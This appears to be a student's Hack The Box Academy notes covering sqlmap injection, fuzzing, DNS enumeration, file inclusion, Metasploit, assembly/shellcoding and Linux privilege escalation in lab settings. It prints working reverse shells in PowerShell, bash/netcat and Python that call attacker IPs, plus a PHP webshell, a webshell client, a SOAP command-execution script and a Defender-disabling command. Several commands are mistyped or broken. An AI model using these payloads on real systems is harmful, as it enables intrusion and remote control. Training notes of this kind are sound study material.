```bash
# What's the contents of table flag2? (Case #2)
sqlmap  --batch --dump -T flag2 --forms --crawl=2
# HTB{700_much_c0n6r475_0n_p057_r3qu357}

# What's the contents of table flag3 (Case#3)
sqlmap -u 94.237.49.212:33817/case2.php --cookie='id=1*' --dump --batch -T flag3 --level=5 --risk=3
# HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}

# What's the contents of table flag4 (Case #4)
sqlmap -r req.txt-u 94.237.49.212:33817/case2.php/?id=1
# HTB{j450n_v00rh335_53nd5_6r475}
```

```bash
# What's the contents of table flag1 in testdb database (Case #1)
sqlmap -u 94.237.50.13:51001/case1.php/ -D testdb -T flag1 --batch --dump --crawl 2
```

```bash
# What's the name of the column containing "style" in it's name (Case #1)
# sqlmap -u "83.136.251.63:57001" --schema
sqlmap -u "83.136.251.63:57001" --search -C style --random-agent --tamper=space2comment

# What's the Kimberly user's password? (Case #1)
sqlmap -u 94.237.63.201:36417" --dump users --passwords crawl=2
```

```bash
# What's the contents of table flag8? (Case #8)
sqlmap -u 83.136.254.233:59619/case8.php -T flag8 --batch --dump --csrf-token="t0ken" --crawl=2 --forms --random-agent
# HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}

# What's the contents of table flag9? (Case #9)
sqlmap -u " 83.136.254.233:59619/case9.php/id=1&uid=4118292662" -T flag9 --batch --dump --randomize=uid --crawl=2 --random-agent
# HTB{700_much_r4nd0mn355_f0r_my_74573}

# What's the contents of table flag10? (Case #10)
# 1
proxychains4 -q -f <(echo "strict_chain\nproxy_dns\nremote_dns_subnet 224\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nhttp 192.168.1.1 8080")
# 2
proxychains4 -q -f <(echo "strict_chain\nremote_dns_-subnet 224\ntcp_read_time_out15000\ntcp_connect_time_out8000\n[ProxyList]\nhttp 192.168.1.1 8080") sqlmap -u "83.136.254.233:59619/case10.php/?id=1&uid=4118292662" -T flag10 --dump --randomize=uid --crawl=2 --random-agent --tamper=space2comment -v 1 --level=3 risk=2


# What's the contents of table flag11? (Case #11)

sqlmap -u "94.237.54.41:34291/case11.php/?id=1" -T flag11 --dump --crawl=2 --tamper=space2comment

```

```bash
# Try to use SQLMap to read the file "/var/www/html/flag.txt".
sqlmap -u "http://94.237.63.201:48886" --file-read "/var/www/html/flag.txt"
# HTB{5up3r_u53r5_4r3_p0w3rful!}

# Use SQLMap to get an interactive OS shell on the remote host # and try to find another flag within the host.
# The flag is in a very common directory!
sqlmap -u "http://94.237.63.201:48886" --os-shell --crawl=2 --technique=E
# HTB{n3v3r_run_db_45_db4}

```

```bash
# What's the contents of the table final_flag?

```

```bash
# values generation 1 to 1000
for i in $(seq 1 1000); do echo $i >> ids.txt; done
```

```bash
# id value fuzzing
ffuf -w ids.txt:FUZZ -u http:83.136.255.180:43420 -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

```bash
# parameter fuzzing
# 94.237.49.178:41421
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://admin.academy.htb:41421/admin/admin.php?FUZZ=key" -fs 798
```

## General

### Intro to Network Traffic Analysis

<!-- RDP w/ htb-student and HTB_@cademy_stdnt! -->

```bash
# Notes
# xfreerdp /v:10.129.43.4 /u:htb-student /p:HTB_@cademy_stdnt!

# What was the name of the new user created on mrb3n's host?

# How many total packets were there in the Guided-analysis PCAP?

# What was the suspicious port that was being used?
```

```bash
# What user account was used to initiate the RDP Connection?


```

### Intro to Assembly Language

### Documentation and Reporting

````bash
xfreerdp /v:10.129.166.23 /u:htb-student /p:HTB_@cademy_stdnt!

# Connect to the testing VM using Xfreerdp and practice testing, documentation, and reporting against the target lab. Once the target spawns, browse to the WriteHat instance on port 443 and authenticate with the provided admin credentials. Play around with the tool and practice adding findings to the database to get a feel for the reporting tools available to us. Remember that all data will be lost once the target resets, so save any practice findings locally! Next, complete the in-progress penetration test. Once you achieve Domain Admin level access, submit the contents of the flag.txt file on the Administrator Desktop on the DC01 host.

### Information Gathering Web Edition

### zonetransfer.me
```bash
## Identifying Nameservers
nslookup -type=NS zonetransfer.me

## Testing for ANY and AXFR Zone Transfer
nslookup -query=AXFR zonetransfer.me nsztmi1.digi.ninja

```bash
## target - 10.129.168.51
## What is the FQDN of the IP address 10.10.34.136?
nslookup 10.10.34.136 10.129.168.51
dig -x 10.10.34.136
nmap -sL 10.10.34.136

## What FQDN is assigned to the IP address 10.10.1.5? Submit the FQDN as the answer.

## Which IP address is assigned to the "us.inlanefreight.htb" subdomain. Submit the IP address as the answer.

# curl -s http://192.168.10.10 -H "Host: randomtarget.com"
# VHost Fuzzing
cat ./vhosts | while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://192.168.10.10 -H "HOST: ${vhost}.randomtarget.com" | grep "Content-Length: ";done
# Ffuf
ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612

## target 10.129.134.122
##  vhost www.inlanefreight.htb

## Enumerate the target and find a vHost that contains the flag No 1. Submit the flag value as your answer (in the format HTB{DATA}).

gobuster vhost -u http://10.129.134.122 -w /opt/useful/SecLists/Discovery/DNS/namelist.txt -t 50
ffuf -u http://10.129.134.122 -H "Host: FUZZ.inlanefreight.htb" -w /opt/useful/SecLists/Discovery/DNS/namelist.txt -mc all -fs 612
gobuster vhost -u http://10.129.134.122 -w /opt/useful/SecLists/Discovery/DNS/namelist.txt -p {GOBUSTER}.inlanefreight.htb --exclude-length 301 -t 10


## Enumerate the target and find a vHost that contains flag No. 2. Submit the flag value as your answer (in the format HTB{DATA}).

## Enumerate the target and find a vHost that contains flag No. 3. Submit the flag value as your answer (in the format HTB{DATA}).

## Enumerate the target and find a vHost that contains flag No. 4. Submit the flag value as your answer (in the format HTB{DATA}).

## Find the specific vHost that starts with the letter "d" and submit the flag value as your answer (in the format HTB{DATA}).
````

```bash
# SKILLS ASSESSMENT
## What is the registrar IANA ID number for the githubapp.com domain?
whois githubapp.com
# 292

## What is the last mailserver returned when querying the MX records for githubapp.com?
dig mx githubapp.com
# aspmx5.googlemail.com

## Perform active infrastructure identification against the host https://i.imgur.com. What server name is returned for the host?
curl -I 'https://i.imgur.com'
# catfactory 1.0

## Perform subdomain enumeration against the target githubapp.com. Which subdomain has the word 'triage' in the name?
# check https://crt.sh/?q=githubapp.com
```

### Using Web Proxies

```bash
# target - 83.136.254.15:31385
# Use Burp Intruder to fuzz for '.html' files under the /admin directory, to find a file containing the flag.
# You can add .html after the position pointer (i.e., §1§.html), or you can use a Payload Processing rule to append .html to each line of payload.

# The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user. Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. Use the "top-usernames-shortlist.txt" wordlist from Seclists.
# Use the 'MD5 Hash' processor and look for the page with a different content-length.

# Run ZAP Scanner on the target above to identify directories and potential vulnerabilities. Once you find the high-level vulnerability, try to use it to read the flag at '/flag.txt'

# The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.
# The button does not always give the flag from the first click, so try to make it easy to click it many times until you get the flag.
# target - 94.237.61.226:30834
# HTB{d154bl3d_bu770n5_w0n7_570p_m3}

# The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.
# 3dac93b8cd250aa8c1a36fffc79a17a

# Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the "alphanum-case.txt" wordlist from Seclist for the payload)
# With payload processing in Burp Intruder, first add the decoded cookie as a prefix to the payload, then encode the entire payload with the same encoding methods you identified earlier (in reverse order). The final payload should be 88 characters long, similar to the one from the previous question.

# You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?
# You may set any website as your RHOST.

```

### File Inclusion

```bash
# target -

# Using the file inclusion find the name of a user on the system that starts with "b".
# Read the passwd file

# Submit the contents of the flag.txt file located in the /usr/share/flags directory.
# Don't forget to traverse paths

# target -

# The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt
# Try to see what path the regular functionality uses

# target -
# Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer
# Try to find an interesting php configuration file

# target -
# Try to gain RCE using one of the PHP wrappers and read the flag at /

# target -
# Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /

# target -
# Use any of the techniques covered in this section to gain RCE and read the flag at /
# Are you using the correct upload directory?

# target -
# Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd

# Try to use a different technique to gain RCE and read the flag at /

# target -
# Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt

# target -
# SSH to with user "htb-student" and password "HTB_@cademy_stdnt!"
# What is the full path to the php.ini file for Apache?

# Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons.
# Place a PHP File in /var/www/html/ which contains a PHP Webshell using SYSTEM(), then use curl to execute the file. Be sure to restart apache after editing the PHP Configuration!

# target -
# Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
7.2.1

```

### Shells & Payloads

```bash
sudo nc -lvnp 443
```

```bash
xfreerdp /v:<target IP address> /u:htb-student /p:HTB_@cademy_stdnt!
xfreerdp /v:10.129.17.161 /u:htb-student /p:HTB_@cademy_stdnt!
/port:2179
```

```bash
 nmap -sC -sV -Pn 10.129.27.76
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-16 22:48 BST
Nmap scan report for 10.129.27.76
Host is up (0.068s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.27.76 - /
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-06-16T14:48:13-07:00
| smb2-time:
|   date: 2024-06-16T21:48:12
|_  start_date: 2024-06-16T20:49:02
|_clock-skew: mean: 2h20m01s, deviation: 4h02m30s, median: 0s
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.29 seconds

```

```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
# 10.10.14.253
```

#### Reverse Shell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Disable AV

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Netcat/Bash Reverse Shell One-liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

#### Open a connection with netcat

```bash
nc 10.10.14.12 7777 > /tmp/f
```

#### NMAP Scan

```bash
nmap -sC -sV -Pn 10.129.201.160
```

#### Msfconsole Target Discovery and Exploit

```bash
nmap -sC -sV -Pn 10.129.27.76 -oX nmap_scan.xml
msfconsole
db_import nmap_scan.xml
hosts
services
use auxiliary/scanner/exploit/windows/scan
set RHOSTS 10.129.27.76
run
search type:exploit name:iis version:10.0
```

scan_and_exploit.sh script

```bash
#!/bin/bash

# Run Nmap scan and save the output
nmap -sC -sV -Pn 10.129.27.76 -oX nmap_scan.xml

# Start Metasploit console and run commands
msfconsole -q -x "
db_import nmap_scan.xml;
use auxiliary/scanner/exploit/windows/scan;
set RHOSTS 10.129.27.76;
run;
exit;"
```

### Command Injections

```bash
# target - 94.237.63.201:33153
```

### Web Service & API Attacks

#### SOAPAction Spoofing

```bash
# retrieve web service WSDL
curl http://<TARGET IP>:3002/wsdl?wsdl
```

### Example WSDL Response

```xml
<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/"
  xmlns:s="http://www.w3.org/2001/XMLSchema"
  xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/"
  xmlns:http="http://schemas.xmlsoap.org/wsdl/http/"
  xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/"
  xmlns:tns="http://tempuri.org/"
  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
  xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"
  xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
  xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">

  <wsdl:types>


    <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">



      <s:element name="LoginRequest">

        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
            <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
          </s:sequence>
        </s:complexType>

      </s:element>


      <s:element name="LoginResponse">

        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          </s:sequence>
        </s:complexType>
      </s:element>


      <s:element name="ExecuteCommandRequest">

        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
          </s:sequence>
        </s:complexType>

      </s:element>

      <s:element name="ExecuteCommandResponse">

        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          </s:sequence>
        </s:complexType>

      </s:element>



    </s:schema>


  </wsdl:types>




  <!-- Login Messages -->
  <wsdl:message name="LoginSoapIn">

    <wsdl:part name="parameters" element="tns:LoginRequest"/>

  </wsdl:message>


  <wsdl:message name="LoginSoapOut">

    <wsdl:part name="parameters" element="tns:LoginResponse"/>

  </wsdl:message>


  <!-- ExecuteCommand Messages -->
  <wsdl:message name="ExecuteCommandSoapIn">

    <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>

  </wsdl:message>


  <wsdl:message name="ExecuteCommandSoapOut">

    <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>

  </wsdl:message>





  <wsdl:portType name="HacktheBoxSoapPort">


    <!-- Login Operaion | PORT -->
    <wsdl:operation name="Login">

      <wsdl:input message="tns:LoginSoapIn"/>
      <wsdl:output message="tns:LoginSoapOut"/>

    </wsdl:operation>


    <!-- ExecuteCommand Operation | PORT -->
    <wsdl:operation name="ExecuteCommand">

      <wsdl:input message="tns:ExecuteCommandSoapIn"/>
      <wsdl:output message="tns:ExecuteCommandSoapOut"/>

    </wsdl:operation>

  </wsdl:portType>





  <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">


    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>

    <!-- SOAP Login Action -->
    <wsdl:operation name="Login">

      <soap:operation soapAction="Login" style="document"/>

      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>

      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>

    </wsdl:operation>


    <!-- SOAP ExecuteCommand Action -->
    <wsdl:operation name="ExecuteCommand">
      <soap:operation soapAction="ExecuteCommand" style="document"/>

      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>

      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>


  </wsdl:binding>





  <wsdl:service name="HacktheboxService">


    <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
      <soap:address location="http://localhost:80/wsdl"/>
    </wsdl:port>


  </wsdl:service>





</wsdl:definitions>
```

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)

```

```bash
python3 client.py
```

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
```

```bash
python3 client_soapaction_spoofing.py
```

```python
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

```bash
python3 automate.py
```

#### Command Injection

http://<TARGET IP>:3003/ping-server.php/ping

```bash
curl http://<TARGET IP>:3003/ping-server.php/system/ls
```

#### Information Disclosure (w/ a twist of SQLi)

```bash
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'

fuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19

curl http://<TARGET IP>:3003/?id=1
[{"id":"1","username":"admin","position":"1"}]
```

```python
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()

```

```bash
python3 brute_api.py http://<TARGET IP>:3003
```

```php
<?php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
{
    header("HTTP/1.1 401 Unauthorized");
}
else
{
  print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
}
```

#### Arbitrary File Upload

```php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
```

```python
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")
```

```bash
python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

### Intro to Assembly Language

Download the attached file, and find the hex value in 'rax' when we reach the instruction at <\_start+16>?
Break and step

```bash
# Note: The -f elf64 flag is used to note that we want to assemble a 64-bit assembly code. If we wanted to assemble a 32-bit code, we would use -f elf
nasm -f elf64 helloWorld.s
# linking
ld -o helloWorld helloWorld.o
# Note: if we were to assemble a 32-bit binary, we need to add the '-m elf_i386' flag.
# executable
./helloWorld
```

```bash
#!/bin/bash

fileName="${1%%.*}" # remove .s extension

nasm -f elf64 ${fileName}".s"
ld ${fileName}".o" -o ${fileName}
[ "$2" == "-g" ] && gdb -q ${fileName} || ./${fileName}
```

```bash
chmod +x assembler.sh
./assembler.sh helloWorld.s
```

```bash
# disassembling to intel syntax
objdump -M intel -d helloWorld
# show assembly code without machine code or addresses
objdump -M intel --no-show-raw-insn --no-addresses -d helloWorld
```

```bash
#The -d flag will only disassemble the .text section of our code. To dump any strings, we can use the -s flag, and add -j .data to only examine the .data section. This means that we also do not need to add -M intel. The final command is as follows:
objdump -sj .data helloWorld
```

```bash
# gdb
sudo apt-get update
sudo apt-get install gdb
# gef
wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
echo source ~/.gdbinit-gef.py >> ~/.gdbinit
# debug
gdb -q ./helloWorld
#
./assembler.sh helloWorld.s -g
#
info functions
info variables
disas _start
b _start
r
b *_start+10
b *0x40100a
c
# For example, if we wanted to examine the next four instructions in line, we will have to examine the $rip register (which holds the address of the next instruction), and use 4 for the count, i for the format, and g for the size (for 8-bytes or 64-bits). So, the final examine command would be x/4ig $rip, as follow
x/4ig $rip
# examine specific memory address
x/s 0x402000
# examine in hex format x/wx 0x401000
x/wx 0x401000
# curr value of all registers
registers
# step one by one
si
# step count
si <NUM>
# step until exit
s
# next and next i
n
ni
# patch
help patch
```

Download the attached file, and find the hex value in 'rax' when we reach the instruction at <\_start+16>?

```bash
cd ~/Downloads
unzip gdb.zip
gdb -q gdb
break *_start+16
r
# $rax = 0x21796d6564637708
```

Add an instruction at the end of the attached code to move the value in "rsp" to "rax". What is the hex value of "rax" at the end of program execution?
Are we moving the value or the address?

```bash
unzip mov.zip
# add - mov rax, [rsp]
bash assembler.sh mov.s
gdb mov
r
# $rax   : 0x400
```

Add an instruction to the end of the attached code to "xor" "rbx" with "15". What is the hex value of 'rbx' at the end?

```bash
unzip arithmetic.zip
# add xor rbx 15
bash assembler.sh arithmetic.s
gdb arithmetic
r
# $rbx   : 0x0
```

Edit the attached assembly code to loop the "loop" label 5 times. What is the hex value of "rax" by the end?
How many times will it loop?

```bash
unzip loops.zip
# add loop loop
bash assembler.sh loops.s -g
gdb loops
r
# $rax   : 0x100000000
```

Try to jump to "func" before "loop loop". What is the hex value of "rbx" at the end?
Will it loop?

```bash
unzip unconditional.zip
# add jmp func
bash assembler.sh unconditional.s
gdb unconditional
break *func+3
r
# $rbx   : 0x4
```

The attached assembly code loops forever. Try to modify (mov rax, 5) to make it not loop. What hex value prevents the loop?
When will "jnz" not jump?

```bash
unzip conditional.zip
# change to mov rax, 2
bash assembler.sh conditional.s -g
r
# 0x2
```

Debug the attached binary to find the flag being pushed to the stack
It gradually builds up in "rsp"

```bash
unzip stack.zip
bash assembler.sh stack.s -g
watch $rsp and repeatedly continue
```

Try assembling and debugging the above code, and note how "call" and "ret" store and retrieve "rip" on the stack. What is the address at the top of the stack after entering "Exit"? (6-digit hex 0xaddress, without zeroes)
You can use "ni" to step to the next call, and "si" to step into the call.

```bash
vim exit.s
bash assembler.sh exit.s -g
break Exit
r
# $rsp   : 0x00007fffffffdf88  →  0x0000000000401014
# 0x401014
```

```bash
sudo pip3 install pwntools
pwn asm 'push rax'  -c 'amd64'
pwn disasm '50' -c 'amd64'
```

```bash
python3
>>> from pwn import *
>>> file = ELF('helloworld')
>>> file.section(".text").hex()
```

```python
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())

```

```bash
python3 shellcoder.py helloworld
```

```bash
#!/bin/bash

for i in $(objdump -d $1 |grep "^ " |cut -f2); do echo -n $i; done; echo;
```

```bash
./shellcoder.sh helloworld
```

```python
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()
```

```bash
 python3 loader.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05'
```

```python
#!/usr/bin/python3

import sys, os, stat
from pwn import *

context(os="linux", arch="amd64", log_level="error")

ELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])
os.chmod(sys.argv[2], stat.S_IEXEC)
```

```bash
python assembler.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05' 'assembler'
./assembler
```

Try to fix the Stack Alignment in "print", so it does not crash, and prints "Its Aligned!". How much boundary was needed to be added? "write a number"
Count pushes/calls so far, each adds 8 bytes, total boundary needed is 16 bytes

```bash
nasm -f elf64 functions.s &&  ld functions.o -o functions -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2 && ./functions
# 8
```

Run the "Exercise Shellcode" to get the flag.

```bash
python assembler.py 4831db536a0a48b86d336d307279217d5048b833645f316e37305f5048b84854427b6c303464504889e64831c0b0014831ff40b7014831d2b2190f054831c0043c4030ff0f05
```

The above server simulates an exploitable server you can execute shellcodes on. Use one of the tools to generate a shellcode that prints the content of '/flag.txt', then connect to the sever with "nc SERVER_IP PORT" to send the shellcode.
/bin/cat /flag.txt

Disassemble 'loaded_shellcode' and modify its assembly code to decode the shellcode, by adding a loop to 'xor' each 8-bytes on the stack with the key in 'rbx'.

The above server simulates a vulnerable server that we can run our shellcodes on. Optimize 'flag.s' for shellcoding and get it under 50 bytes, then send the shellcode to get the flag. (Feel free to find/create a custom shellcode)

#### Linux Privelge Escalation

```bash
# enumerate set-user-id (setuid) permission
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
# enumerate set-group-id (setgid) permission
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

```bash
# special permissions - break out of restricted environment + spawn shell
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

```bash
ssh htb-student@10.129.132.178
# password 'Academy_LLPE!"

Find a file with the setuid bit set that was not shown in the section command output (full path to the binary).

# -rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/htb-student/shared_obj_hijack/payroll
# -rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/mrb3n/payroll
# -rwSr--r-- 1 root root 0 Aug 31  2020 /home/cliff.moore/netracer
# -rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
# -rwsr-xr-x 1 root root 44664 Nov 29  2022 /bin/su
# * -rwsr-xr-x 1 root root 109000 Jan 30  2018 /bin/sed
# -rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
# -rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
# -rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
# -rwsr-xr-x 1 root root 100760 May  5  2023 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
